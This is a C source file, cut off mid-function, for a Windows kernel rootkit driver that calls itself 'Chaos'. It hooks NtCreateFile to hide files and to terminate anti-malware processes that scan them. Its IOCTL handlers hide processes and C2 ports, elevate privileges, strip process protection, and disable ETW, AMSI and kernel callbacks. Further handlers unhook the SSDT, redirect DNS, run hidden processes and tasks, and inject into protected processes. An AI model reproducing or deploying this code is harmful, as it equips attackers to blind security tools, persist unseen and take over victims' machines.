#include "ZwSwapCert.h"
#include "header.h"
#include <intrin.h>

NTSTATUS WINAPI FakeNtCreateFile2(PHANDLE FileHandle, ACCESS_MASK DesiredAccess,
                                  POBJECT_ATTRIBUTES ObjectAttributes,
                                  PIO_STATUS_BLOCK IoStatusBlock,
                                  PLARGE_INTEGER AllocationSize,
                                  ULONG FileAttributes, ULONG ShareAccess,
                                  ULONG CreateDisposition, ULONG CreateOptions,
                                  PVOID EaBuffer, ULONG EaLength) {
  NTSTATUS status = STATUS_UNSUCCESSFUL;

  __try {

    __try {

      if (ObjectAttributes && ObjectAttributes->ObjectName &&
          ObjectAttributes->ObjectName->Buffer) {

        // Check if the filename matches the hook list
        if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename) &&
            !wcsstr(ObjectAttributes->ObjectName->Buffer, L".lnk")) {

          PVOID process = NULL;

          NTSTATUS ret = PsLookupProcessByProcessId(
              (HANDLE)PsGetCurrentProcessId(), &process);

          if (ret != STATUS_SUCCESS) {

            if (ret == STATUS_INVALID_PARAMETER) {
              DbgPrint("the process ID was not found.");
            }

            if (ret == STATUS_INVALID_CID) {
              DbgPrint("the specified client ID is not valid.");
            }

            return (-1);
          }

          RtlCopyUnicodeString(ObjectAttributes->ObjectName,
                               &xHooklist.decoyFile);

          ObjectAttributes->ObjectName->Length = xHooklist.decoyFile.Length;
          ObjectAttributes->ObjectName->MaximumLength =
              xHooklist.decoyFile.MaximumLength;

          ULONG_PTR EProtectionLevel =
              (ULONG_PTR)process + eoffsets.protection_offset;

          if (process)
            ObDereferenceObject(process);

          if (*(BYTE *)EProtectionLevel ==
              global_protection_levels.PS_PROTECTED_ANTIMALWARE_LIGHT) {
            DbgPrint("anti-malware trying to scan it!!\n");

            status = ZwTerminateProcess(ZwCurrentProcess(), STATUS_SUCCESS);
            if (!NT_SUCCESS(status)) {
              DbgPrint("Failed to terminate the anti-malware: %08X\n", status);
            } else {
              DbgPrint("anti-malware terminated successfully.\n");
            }
          }

          return (IoCreateFile(FileHandle, DesiredAccess, ObjectAttributes,
                               IoStatusBlock, AllocationSize, FileAttributes,
                               ShareAccess, CreateDisposition, CreateOptions,
                               EaBuffer, EaLength, CreateFileTypeNone,
                               (PVOID)NULL, 0));
        }
      }

      return (IoCreateFile(FileHandle, DesiredAccess, ObjectAttributes,
                           IoStatusBlock, AllocationSize, FileAttributes,
                           ShareAccess, CreateDisposition, CreateOptions,
                           EaBuffer, EaLength, CreateFileTypeNone, NULL, 0));

    } __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION
                    ? EXCEPTION_EXECUTE_HANDLER
                    : EXCEPTION_CONTINUE_SEARCH) {
      DbgPrint("An issue occurred while hooking NtCreateFile (Hook Removed) "
               "(%08X) \n",
               GetExceptionCode());

      write_to_read_only_memory(xHooklist.NtCreateFileAddress,
                                &xHooklist.NtCreateFileOrigin,
                                sizeof(xHooklist.NtCreateFileOrigin));
    }
  } __finally {
    // KeReleaseMutex(&Mutex, 0);
  }

  return (status);
}

NTSTATUS WINAPI FakeNtCreateFile3(PHANDLE FileHandle, ACCESS_MASK DesiredAccess,
                                  POBJECT_ATTRIBUTES ObjectAttributes,
                                  PIO_STATUS_BLOCK IoStatusBlock,
                                  PLARGE_INTEGER AllocationSize,
                                  ULONG FileAttributes, ULONG ShareAccess,
                                  ULONG CreateDisposition, ULONG CreateOptions,
                                  PVOID EaBuffer, ULONG EaLength) {
  NTSTATUS status = STATUS_UNSUCCESSFUL;

  __try {

    __try {

      if (ObjectAttributes && ObjectAttributes->ObjectName &&
          ObjectAttributes->ObjectName->Buffer) {

        // Check if the filename matches the hook list
        if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename)) {

          PVOID process = NULL;

          NTSTATUS ret = PsLookupProcessByProcessId(
              (HANDLE)PsGetCurrentProcessId(), &process);

          if (ret != STATUS_SUCCESS) {
            if (ret == STATUS_INVALID_PARAMETER) {
              DbgPrint("the process ID was not found.");
            }

            if (ret == STATUS_INVALID_CID) {
              DbgPrint("the specified client ID is not valid.");
            }

            return (-1);
          }

          ULONG_PTR EProtectionLevel =
              (ULONG_PTR)process + eoffsets.protection_offset;

          if (process)
            ObDereferenceObject(process);

          if (*(BYTE *)EProtectionLevel ==
              global_protection_levels.PS_PROTECTED_ANTIMALWARE_LIGHT) {
            DbgPrint("anti-malware trying to scan it!!\n");

            status = ZwTerminateProcess(ZwCurrentProcess(), STATUS_SUCCESS);
            if (!NT_SUCCESS(status)) {
              DbgPrint("Failed to terminate the anti-malware: %08X\n", status);
            } else {
              DbgPrint("anti-malware terminated successfully.\n");
            }
          }

          return (IoCreateFile(FileHandle, DesiredAccess, ObjectAttributes,
                               IoStatusBlock, AllocationSize, FileAttributes,
                               ShareAccess, CreateDisposition, CreateOptions,
                               EaBuffer, EaLength, CreateFileTypeNone,
                               (PVOID)NULL, 0));
        }
      }

      return (IoCreateFile(FileHandle, DesiredAccess, ObjectAttributes,
                           IoStatusBlock, AllocationSize, FileAttributes,
                           ShareAccess, CreateDisposition, CreateOptions,
                           EaBuffer, EaLength, CreateFileTypeNone, (PVOID)NULL,
                           0));
    } __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION
                    ? EXCEPTION_EXECUTE_HANDLER
                    : EXCEPTION_CONTINUE_SEARCH) {
      DbgPrint("An issue occurred while hooking NtCreateFile (Hook Removed) "
               "(%08X) \n",
               GetExceptionCode());

      write_to_read_only_memory(xHooklist.NtCreateFileAddress,
                                &xHooklist.NtCreateFileOrigin,
                                sizeof(xHooklist.NtCreateFileOrigin));
    }
  } __finally {
    // KeReleaseMutex(&Mutex, 0);
  }

  return (status);
}

NTSTATUS WINAPI FakeNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess,
                                 POBJECT_ATTRIBUTES ObjectAttributes,
                                 PIO_STATUS_BLOCK IoStatusBlock,
                                 PLARGE_INTEGER AllocationSize,
                                 ULONG FileAttributes, ULONG ShareAccess,
                                 ULONG CreateDisposition, ULONG CreateOptions,
                                 PVOID EaBuffer, ULONG EaLength) {

  int requestorPid = 0x0;

  __try {

    if (ObjectAttributes && ObjectAttributes->ObjectName &&
        ObjectAttributes->ObjectName->Buffer) {

      if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename)) {

        DbgPrint("Blocked : %wZ.\n", ObjectAttributes->ObjectName);

        FLT_CALLBACK_DATA flt;

        DbgPrint("requestor pid %d\n",
                 requestorPid = FltGetRequestorProcessId(&flt));

        if ((ULONG)requestorPid == (ULONG)xHooklist.pID ||
            !requestorPid) // more testing need to be done at this part ,used 0
                           // to avoid restricting the same process ...
        {

          DbgPrint("process allowed\n");

          return (IoCreateFile(FileHandle, DesiredAccess, ObjectAttributes,
                               IoStatusBlock, AllocationSize, FileAttributes,
                               ShareAccess, CreateDisposition, CreateOptions,
                               EaBuffer, EaLength, CreateFileTypeNone,
                               (PVOID)NULL, 0));
        }

        return (STATUS_ACCESS_DENIED);
      }
    }

    return (IoCreateFile(
        FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock,
        AllocationSize, FileAttributes, ShareAccess, CreateDisposition,
        CreateOptions, EaBuffer, EaLength, CreateFileTypeNone, (PVOID)NULL, 0));
  } __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION
                  ? EXCEPTION_EXECUTE_HANDLER
                  : EXCEPTION_CONTINUE_SEARCH) {
    DbgPrint(
        "an issue occured while hooking NtCreateFile (Hook Removed ) (%08) \n",
        GetExceptionCode());

    write_to_read_only_memory(xHooklist.NtCreateFileAddress,
                              &xHooklist.NtCreateFileOrigin,
                              sizeof(xHooklist.NtCreateFileOrigin));
  }
  // Note: __finally removed - cannot combine __except and __finally in same
  // __try block KeReleaseMutex(&Mutex, FALSE);
  return (STATUS_SUCCESS);
}

DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo, int Option) {
  if (!hooklist_s || !rfileinfo.filename || (!rfileinfo.rpid && Option == 1)) {
    DbgPrint("invalid structure provided \n");
    return (-1);
  }

  if ((uintptr_t)hooklist_s->NtCreateFileHookAddress ==
          (uintptr_t)&FakeNtCreateFile &&
      Option == 1 && hooklist_s->pID == rfileinfo.rpid) {
    DbgPrint("Hook already active for function 1\n");
    return (STATUS_ALREADY_EXISTS);
  }

  else if ((uintptr_t)hooklist_s->NtCreateFileHookAddress ==
               (uintptr_t)&FakeNtCreateFile2 &&
           Option == 2) {
    DbgPrint("Hook already active for function 2\n");
    return (STATUS_ALREADY_EXISTS);
  }

  else if ((uintptr_t)hooklist_s->NtCreateFileHookAddress ==
               (uintptr_t)&FakeNtCreateFile3 &&
           Option == 3) {
    DbgPrint("Hook already active for function 3\n");
    return (STATUS_ALREADY_EXISTS);
  }

  if (Option == 1) {
    DbgPrint("allowing PID  \n", rfileinfo.rpid);

    hooklist_s->pID = rfileinfo.rpid;

    hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile;
  }

  else if (Option == 2)
    hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile2;
  else if (Option == 3)
    hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile3;

  memcpy(hooklist_s->NtCreateFilePatch + 2,
         &hooklist_s->NtCreateFileHookAddress, sizeof(void *));

  RtlCopyMemory(hooklist_s->filename, rfileinfo.filename,
                sizeof(rfileinfo.filename));

  write_to_read_only_memory(hooklist_s->NtCreateFileAddress,
                            &hooklist_s->NtCreateFilePatch,
                            sizeof(hooklist_s->NtCreateFilePatch));

  DbgPrint("Hooks installed \n");

  return (0);
}

void unloadv(PDRIVER_OBJECT driverObject) {
  __try {

    __try {
      if (xHooklist.NtCreateFileAddress)
        write_to_read_only_memory(xHooklist.NtCreateFileAddress,
                                  &xHooklist.NtCreateFileOrigin,
                                  sizeof(xHooklist.NtCreateFileOrigin));

      PrepareDriverForUnload();

    } __except (EXCEPTION_EXECUTE_HANDLER) {
      DbgPrint("An error occured during driver unloading \n");
    }
  } __finally {
    IoDeleteSymbolicLink(&SymbName);

    IoDeleteDevice(driverObject->DeviceObject);

    DbgPrint("Driver Unloaded\n");
  }
}

NTSTATUS processIoctlRequest(DEVICE_OBJECT *DeviceObject, IRP *Irp) {
  PIO_STACK_LOCATION pstack = IoGetCurrentIrpStackLocation(Irp);
  KPROCESSOR_MODE prevMode = ExGetPreviousMode();

  int pstatus = 0;
  int inputInt = 0;

  __try {
    // if system offsets not supported / disable features
    // that require the use of offsets to avoid crash
    if (pstack->Parameters.DeviceIoControl.IoControlCode >= HIDE_PROC &&
        pstack->Parameters.DeviceIoControl.IoControlCode <=
            UNPROTECT_ALL_PROCESSES &&
        xHooklist.check_off) {
      pstatus = ERROR_UNSUPPORTED_OFFSET;
      __leave;
    }

    /*
    if (prevMode == UserMode && Irp->AssociatedIrp.SystemBuffer) {
      __try {
        ProbeForRead(Irp->AssociatedIrp.SystemBuffer,
                     pstack->Parameters.DeviceIoControl.InputBufferLength, 1);
      } __except (EXCEPTION_EXECUTE_HANDLER) {
        pstatus = GetExceptionCode();
        DbgPrint("ProbeForRead failed :((((((  : 0x%08X\n", pstatus);
        __leave;
      }
    }
    */

    switch (pstack->Parameters.DeviceIoControl.IoControlCode) {
    case HIDE_PROC: {
      if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int)) {
        pstatus = STATUS_BUFFER_TOO_SMALL;
        break;
      }
      RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer,
                    sizeof(inputInt));

      pstatus = HideProcess(inputInt);

      DbgPrint("Received input value: %d\n", inputInt);
      break;
    }

    case PRIVILEGE_ELEVATION: {
      if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int)) {
        pstatus = STATUS_BUFFER_TOO_SMALL;
        break;
      }

      RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer,
                    sizeof(inputInt));

      pstatus = PrivilegeElevationForProcess(inputInt);

      DbgPrint("Received input value: %d\n", inputInt);

      break;
    }

    case CR_SET_PROTECTION_LEVEL_CTL: {
      if (pstack->Parameters.DeviceIoControl.InputBufferLength <
          sizeof(CR_SET_PROTECTION_LEVEL)) {
        pstatus = STATUS_BUFFER_TOO_SMALL;
        break;
      }

      PCR_SET_PROTECTION_LEVEL Args = Irp->AssociatedIrp.SystemBuffer;

      pstatus = ChangeProtectionLevel(Args);

      break;
    }

    case RESTRICT_ACCESS_TO_FILE_CTL: {
      if (pstack->Parameters.DeviceIoControl.InputBufferLength <
          sizeof(fopera)) {
        pstatus = STATUS_BUFFER_TOO_SMALL;
        break;
      }
      fopera rfileinfo = {0};
      RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer,
                    sizeof(rfileinfo));

      pstatus = initializehooklist(&xHooklist, rfileinfo, 1);
      DbgPrint("File access restricted ");
      break;
    }

    case PROTECT_FILE_AGAINST_ANTI_MALWARE_CTL: {
      if (pstack->Parameters.DeviceIoControl.InputBufferLength <
          sizeof(fopera)) {
        pstatus = STATUS_BUFFER_TOO_SMALL;
        break;
      }
      fopera rfileinfo = {0};
      RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer,
                    sizeof(rfileinfo));

      pstatus = initializehooklist(&xHooklist, rfileinfo, 3);
      DbgPrint(" file protected against anti-malware processes ");
      break;
    }

    case BYPASS_INTEGRITY_FILE_CTL: //
    {
      if (pstack->Parameters.DeviceIoControl.InputBufferLength <
          sizeof(fopera)) {
        pstatus = STATUS_BUFFER_TOO_SMALL;
        break;
      }
      fopera rfileinfo = {0};
      RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer,
                    sizeof(rfileinfo));
      pstatus = initializehooklist(&xHooklist, rfileinfo, 2);

      DbgPrint("bypass integrity check ");
      break;
    }

    case UNPROTECT_ALL_PROCESSES: {
      pstatus = UnprotectAllProcesses();

      DbgPrint("all Processes Protection has been removed");
      break;
    }

    case ZWSWAPCERT_CTL: {
      if (NT_SUCCESS(pstatus = ScDriverEntry(DeviceObject->DriverObject,
                                             registryPathCopy))) {
        DbgPrint("{ZwSwapCert} Driver swapped in memory and on disk.\n");

      } else {
        DbgPrint("{ZwSwapCert} Failed to swap driver \n");
      }
      break;
    }

      // ================================================================
      // AV/EDR BYPASS IOCTLs
      // ================================================================

    case KILL_ETW_CTL: {
      DbgPrint("[Chaos] KILL_ETW_CTL received\n");
      pstatus = KillEtw();
      break;
    }

    case KILL_AMSI_CTL: {
      DbgPrint("[Chaos] KILL_AMSI_CTL received\n");
      HANDLE targetPid = NULL;
      if (pstack->Parameters.DeviceIoControl.InputBufferLength >=
          sizeof(HANDLE)) {
        RtlCopyMemory(&targetPid, Irp->AssociatedIrp.SystemBuffer,
                      sizeof(HANDLE));
      }
      pstatus = KillAmsi(targetPid);
      break;
    }

    case KILL_PROCESS_CALLBACKS_CTL: {
      DbgPrint("[Chaos] KILL_PROCESS_CALLBACKS_CTL received\n");
      pstatus = KillProcessCallbacks();
      break;
    }

    case KILL_THREAD_CALLBACKS_CTL: {
      DbgPrint("[Chaos] KILL_THREAD_CALLBACKS_CTL received\n");
      pstatus = KillThreadCallbacks();
      break;
    }

    case KILL_IMAGE_CALLBACKS_CTL: {
      DbgPrint("[Chaos] KILL_IMAGE_CALLBACKS_CTL received\n");
      pstatus = KillImageCallbacks();
      break;
    }

    case KILL_REGISTRY_CALLBACKS_CTL: {
      DbgPrint("[Chaos] KILL_REGISTRY_CALLBACKS_CTL received\n");
      pstatus = KillRegistryCallbacks();
      break;
    }

    case KILL_ALL_CALLBACKS_CTL: {
      DbgPrint("[Chaos] KILL_ALL_CALLBACKS_CTL received\n");
      pstatus = KillAllCallbacks();
      break;
    }

    case FORCE_UNLOAD_DRIVER_CTL: {
      DbgPrint("[Chaos] FORCE_UNLOAD_DRIVER_CTL received\n");
      if (pstack->Parameters.DeviceIoControl.InputBufferLength <
          sizeof(DRIVER_UNLOAD_REQUEST)) {
        pstatus = STATUS_BUFFER_TOO_SMALL;
        break;
      }
      PDRIVER_UNLOAD_REQUEST req =
          (PDRIVER_UNLOAD_REQUEST)Irp->AssociatedIrp.SystemBuffer;
      UNICODE_STRING driverName;
      RtlInitUnicodeString(&driverName, req->DriverName);
      pstatus = ForceUnloadDriver(&driverName);
      break;
    }

    case UNHOOK_SSDT_CTL: {
      DbgPrint("[Chaos] UNHOOK_SSDT_CTL received\n");
      pstatus = UnhookSsdt();
      break;
    }

    case LIST_SSDT_HOOKS_CTL: {
      DbgPrint("[Chaos] LIST_SSDT_HOOKS_CTL received\n");
      ULONG bytesWritten = 0;
      pstatus = ListSsdtHooks(
          Irp->AssociatedIrp.SystemBuffer,
          pstack->Parameters.DeviceIoControl.OutputBufferLength, &bytesWritten);
      Irp->IoStatus.Information = bytesWritten;
      break;
    }

      // ================================================================
      // NETWORKING IOCTLs
      // ================================================================

    case HIDE_PORT_CTL: {
      DbgPrint("[Chaos] HIDE_PORT_CTL received\n");
      if (pstack->Parameters.DeviceIoControl.InputBufferLength <
          sizeof(PORT_REQUEST)) {
        pstatus = STATUS_BUFFER_TOO_SMALL;
        break;
      }
      PPORT_REQUEST req = (PPORT_REQUEST)Irp->AssociatedIrp.SystemBuffer;
      pstatus = HidePort(req->Port, req->IsTcp);
      break;
    }

    case UNHIDE_PORT_CTL: {
      DbgPrint("[Chaos] UNHIDE_PORT_CTL received\n");
      if (pstack->Parameters.DeviceIoControl.InputBufferLength <
          sizeof(PORT_REQUEST)) {
        pstatus = STATUS_BUFFER_TOO_SMALL;
        break;
      }
      PPORT_REQUEST req = (PPORT_REQUEST)Irp->AssociatedIrp.SystemBuffer;
      pstatus = UnhidePort(req->Port, req->IsTcp);
      break;
    }

    case HIDE_ALL_C2_CTL: {
      DbgPrint("[Chaos] HIDE_ALL_C2_CTL received\n");
      pstatus = HideAllC2Ports();
      break;
    }

    case ADD_DNS_RULE_CTL: {
      DbgPrint("[Chaos] ADD_DNS_RULE_CTL received\n");
      if (pstack->Parameters.DeviceIoControl.InputBufferLength <
          sizeof(DNS_REQUEST)) {
        pstatus = STATUS_BUFFER_TOO_SMALL;
        break;
      }
      PDNS_REQUEST req = (PDNS_REQUEST)Irp->AssociatedIrp.SystemBuffer;
      pstatus = AddDnsRule(req->Domain, req->RedirectIp);
      break;
    }

    case REMOVE_DNS_RULE_CTL: {
      DbgPrint("[Chaos] REMOVE_DNS_RULE_CTL received\n");
      if (pstack->Parameters.DeviceIoControl.InputBufferLength <
          sizeof(DNS_REQUEST)) {
        pstatus = STATUS_BUFFER_TOO_SMALL;
        break;
      }
      PDNS_REQUEST req = (PDNS_REQUEST)Irp->AssociatedIrp.SystemBuffer;
      pstatus = RemoveDnsRule(req->Domain);
      break;
    }

    case LIST_DNS_RULES_CTL: {
      DbgPrint("[Chaos] LIST_DNS_RULES_CTL received\n");
      ULONG bytesWritten = 0;
      pstatus = ListDnsRules(
          Irp->AssociatedIrp.SystemBuffer,
          pstack->Parameters.DeviceIoControl.OutputBufferLength, &bytesWritten);
      Irp->IoStatus.Information = bytesWritten;
      break;
    }

    case BLOCK_IP_CTL: {
      DbgPrint("[Chaos] BLOCK_IP_CTL received\n");
      if (pstack->Parameters.DeviceIoControl.InputBufferLength <
          sizeof(IP_REQUEST)) {
        pstatus = STATUS_BUFFER_TOO_SMALL;
        break;
      }
      PIP_REQUEST req = (PIP_REQUEST)Irp->AssociatedIrp.SystemBuffer;
      pstatus = BlockIp(req->Ip, req->Port);
      break;
    }

    case UNBLOCK_IP_CTL: {
      DbgPrint("[Chaos] UNBLOCK_IP_CTL received\n");
      if (pstack->Parameters.DeviceIoControl.InputBufferLength <
          sizeof(IP_REQUEST)) {
        pstatus = STATUS_BUFFER_TOO_SMALL;
        break;
      }
      PIP_REQUEST req = (PIP_REQUEST)Irp->AssociatedIrp.SystemBuffer;
      pstatus = UnblockIp(req->Ip, req->Port);
      break;
    }

    case LIST_BLOCKED_CTL: {
      DbgPrint("[Chaos] LIST_BLOCKED_CTL received\n");
      ULONG bytesWritten = 0;
      pstatus = ListBlockedIps(
          Irp->AssociatedIrp.SystemBuffer,
          pstack->Parameters.DeviceIoControl.OutputBufferLength, &bytesWritten);
      Irp->IoStatus.Information = bytesWritten;
      break;
    }

    case START_STEALTH_LISTENER_CTL: {
      DbgPrint("[Chaos] START_STEALTH_LISTENER_CTL received\n");
      USHORT port = 0;
      if (pstack->Parameters.DeviceIoControl.InputBufferLength >=
          sizeof(USHORT)) {
        RtlCopyMemory(&port, Irp->AssociatedIrp.SystemBuffer, sizeof(USHORT));
      }
      pstatus = StartStealthListener(port);
      break;
    }

    case STOP_STEALTH_LISTENER_CTL: {
      DbgPrint("[Chaos] STOP_STEALTH_LISTENER_CTL received\n");
      pstatus = StopStealthListener();
      break;
    }

    case GET_BOOT_DIAGNOSTICS_CTL: {
      DbgPrint("[Chaos] GET_BOOT_DIAGNOSTICS_CTL received\n");
      if (pstack->Parameters.DeviceIoControl.OutputBufferLength <
          sizeof(BOOT_DIAGNOSTICS)) {
        pstatus = STATUS_BUFFER_TOO_SMALL;
        break;
      }

      PBOOT_DIAGNOSTICS diag =
          (PBOOT_DIAGNOSTICS)Irp->AssociatedIrp.SystemBuffer;
      RtlZeroMemory(diag, sizeof(BOOT_DIAGNOSTICS));

      // Fill diagnostics
      diag->DriverConnected = TRUE;
      diag->EtwDisabled = g_EtwDisabled;
      diag->AmsiCallbackRegistered = g_AmsiCallbackRegistered;
      diag->PayloadConfigLoaded = (g_PayloadConfig.PayloadPath[0] != L'\0');
      diag->ProcessCallbackRegistered =
          g_PayloadConfig.ProcessCallbackRegistered;

      if (diag->PayloadConfigLoaded) {
        RtlCopyMemory(diag->PayloadPath, g_PayloadConfig.PayloadPath,
                      sizeof(diag->PayloadPath) - sizeof(WCHAR));
      }

      // Check Defender RTP status
      HANDLE hKey = NULL;
      OBJECT_ATTRIBUTES objAttr;
      UNICODE_STRING keyPath;

      RtlInitUnicodeString(&keyPath,
                           L"\\Registry\\Machine\\SOFTWARE\\Policies\\Microsoft"
                           L"\\Windows Defender\\Real-Time Protection");
      InitializeObjectAttributes(&objAttr, &keyPath,
                                 OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL,
                                 NULL);

      if (NT_SUCCESS(ZwOpenKey(&hKey, KEY_READ, &objAttr))) {
        UCHAR buffer[sizeof(KEY_VALUE_PARTIAL_INFORMATION) + sizeof(ULONG)];
        UNICODE_STRING valueName;
        ULONG resultLen;

        RtlInitUnicodeString(&valueName, L"DisableRealtimeMonitoring");
        if (NT_SUCCESS(ZwQueryValueKey(hKey, &valueName,
                                       KeyValuePartialInformation, buffer,
                                       sizeof(buffer), &resultLen))) {
          PKEY_VALUE_PARTIAL_INFORMATION pInfo =
              (PKEY_VALUE_PARTIAL_INFORMATION)buffer;
          if (pInfo->Type == REG_DWORD && *(PULONG)pInfo->Data == 1) {
            diag->DefenderRtpDisabled = TRUE;
          }
        }
        ZwClose(hKey);
      }

      // Check WinDefend service status
      RtlInitUnicodeString(&keyPath, L"\\Registry\\Machine\\SYSTEM\\CurrentCont"
                                     L"rolSet\\Services\\WinDefend");
      InitializeObjectAttributes(&objAttr, &keyPath,
                                 OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL,
                                 NULL);

      if (NT_SUCCESS(ZwOpenKey(&hKey, KEY_READ, &objAttr))) {
        UCHAR buffer[sizeof(KEY_VALUE_PARTIAL_INFORMATION) + sizeof(ULONG)];
        UNICODE_STRING valueName;
        ULONG resultLen;

        RtlInitUnicodeString(&valueName, L"Start");
        if (NT_SUCCESS(ZwQueryValueKey(hKey, &valueName,
                                       KeyValuePartialInformation, buffer,
                                       sizeof(buffer), &resultLen))) {
          PKEY_VALUE_PARTIAL_INFORMATION pInfo =
              (PKEY_VALUE_PARTIAL_INFORMATION)buffer;
          if (pInfo->Type == REG_DWORD && *(PULONG)pInfo->Data == 4) {
            diag->DefenderServiceDisabled = TRUE;
          }
        }
        ZwClose(hKey);
      }

      Irp->IoStatus.Information = sizeof(BOOT_DIAGNOSTICS);
      pstatus = STATUS_SUCCESS;
      break;
    }

    // ========================================================================
    // RULE LISTING IOCTLs - Return arrays to usermode
    // ========================================================================
    case GET_DNS_RULES_CTL: {
      DbgPrint("[Chaos] GET_DNS_RULES_CTL received\n");
      ULONG requiredSize = sizeof(g_DnsRules);
      if (pstack->Parameters.DeviceIoControl.OutputBufferLength <
          requiredSize) {
        DbgPrint("[Chaos] Buffer too small: %u < %u\n",
                 pstack->Parameters.DeviceIoControl.OutputBufferLength,
                 requiredSize);
        pstatus = STATUS_BUFFER_TOO_SMALL;
        break;
      }
      KIRQL oldIrql;
      KeAcquireSpinLock(&g_NetworkLock, &oldIrql);
      RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, g_DnsRules, requiredSize);
      KeReleaseSpinLock(&g_NetworkLock, oldIrql);
      Irp->IoStatus.Information = requiredSize;
      pstatus = STATUS_SUCCESS;
      DbgPrint("[Chaos] Returned %u bytes of DNS rules\n", requiredSize);
      break;
    }

    case GET_BLOCKED_IPS_CTL: {
      DbgPrint("[Chaos] GET_BLOCKED_IPS_CTL received\n");
      ULONG requiredSize = sizeof(g_BlockedIps);
      if (pstack->Parameters.DeviceIoControl.OutputBufferLength <
          requiredSize) {
        DbgPrint("[Chaos] Buffer too small: %u < %u\n",
                 pstack->Parameters.DeviceIoControl.OutputBufferLength,
                 requiredSize);
        pstatus = STATUS_BUFFER_TOO_SMALL;
        break;
      }
      KIRQL oldIrql;
      KeAcquireSpinLock(&g_NetworkLock, &oldIrql);
      RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, g_BlockedIps,
                    requiredSize);
      KeReleaseSpinLock(&g_NetworkLock, oldIrql);
      Irp->IoStatus.Information = requiredSize;
      pstatus = STATUS_SUCCESS;
      DbgPrint("[Chaos] Returned %u bytes of blocked IPs\n", requiredSize);
      break;
    }

    case GET_HIDDEN_PORTS_CTL: {
      DbgPrint("[Chaos] GET_HIDDEN_PORTS_CTL received\n");
      ULONG requiredSize = sizeof(g_HiddenPorts);
      if (pstack->Parameters.DeviceIoControl.OutputBufferLength <
          requiredSize) {
        DbgPrint("[Chaos] Buffer too small: %u < %u\n",
                 pstack->Parameters.DeviceIoControl.OutputBufferLength,
                 requiredSize);
        pstatus = STATUS_BUFFER_TOO_SMALL;
        break;
      }
      KIRQL oldIrql;
      KeAcquireSpinLock(&g_NetworkLock, &oldIrql);
      RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, g_HiddenPorts,
                    requiredSize);
      KeReleaseSpinLock(&g_NetworkLock, oldIrql);
      Irp->IoStatus.Information = requiredSize;
      pstatus = STATUS_SUCCESS;
      DbgPrint("[Chaos] Returned %u bytes of hidden ports\n", requiredSize);
      break;
    }

    // ==========================================================================
    // POST-EXPLOITATION IOCTLs
    // ==========================================================================
    case RUN_HIDDEN_PROCESS_CTL: {
      PRUN_HIDDEN_REQUEST request =
          (PRUN_HIDDEN_REQUEST)Irp->AssociatedIrp.SystemBuffer;
      if (!request || pstack->Parameters.DeviceIoControl.InputBufferLength <
                          sizeof(RUN_HIDDEN_REQUEST)) {
        pstatus = STATUS_INVALID_PARAMETER;
        break;
      }
      pstatus = RunHiddenProcess(request);
      break;
    }

    case LIST_HIDDEN_PROCESSES_CTL: {
      ULONG bytesWritten = 0;
      pstatus = ListHiddenProcesses(
          Irp->AssociatedIrp.SystemBuffer,
          pstack->Parameters.DeviceIoControl.OutputBufferLength, &bytesWritten);
      Irp->IoStatus.Information = bytesWritten;
      break;
    }

    case KILL_HIDDEN_PROCESS_CTL: {
      PULONG pidPtr = (PULONG)Irp->AssociatedIrp.SystemBuffer;
      if (!pidPtr || pstack->Parameters.DeviceIoControl.InputBufferLength <
                         sizeof(ULONG)) {
        pstatus = STATUS_INVALID_PARAMETER;
        break;
      }
      pstatus = KillHiddenProcess(*pidPtr);
      break;
    }

    case INJECT_INTO_PPL_CTL: {
      PPPL_INJECT_REQUEST request =
          (PPPL_INJECT_REQUEST)Irp->AssociatedIrp.SystemBuffer;
      if (!request || pstack->Parameters.DeviceIoControl.InputBufferLength <
                          sizeof(PPL_INJECT_REQUEST)) {
        pstatus = STATUS_INVALID_PARAMETER;
        break;
      }
      pstatus = InjectIntoPPL(request);
      break;
    }

    case CREATE_HIDDEN_TASK_CTL: {
      PCREATE_HIDDEN_TASK_REQUEST request =
          (PCREATE_HIDDEN_TASK_REQUEST)Irp->AssociatedIrp.SystemBuffer;
      if (!request || pstack->Parameters.DeviceIoControl.InputBufferLength <
                          sizeof(CREATE_HIDDEN_TASK_REQUEST)) {
        pstatus = STATUS_INVALID_PARAMETER;
        break;
      }
      pstatus = CreateHiddenTask(request);
      break;
    }

    case LIST_HIDDEN_TASKS_CTL: {
      ULONG bytesWritten = 0;
      pstatus = ListHiddenTasks(
          Irp->AssociatedIrp.SystemBuffer,
          pstack->Parameters.DeviceIoControl.OutputBufferLength, &bytesWritten);
      Irp->IoStatus.Information = bytesWritten;
      break;
    }

    case DELETE_HIDDEN_TASK_CTL: {
      PWCHAR taskName = (PWCHAR)Irp->AssociatedIrp.SystemBuffer;
      if (!taskName || pstack->Parameters.DeviceIoControl.InputBufferLength <
                           sizeof(WCHAR)) {
        pstatus = STATUS_INVALID_PARAMETER;
        break;
      }
      pstatus = DeleteHiddenTask(taskName);
      break;
    }

    case SPAWN_WITH_PPID_CTL: {
      PSPAWN_PPID_REQUEST request =
          (PSPAWN_PPID_REQUEST)Irp->AssociatedIrp.SystemBuffer;
      if (!request || pstack->Parameters.DeviceIoControl.InputBufferLength <
                          sizeof(SPAWN_PPID_REQUEST)) {
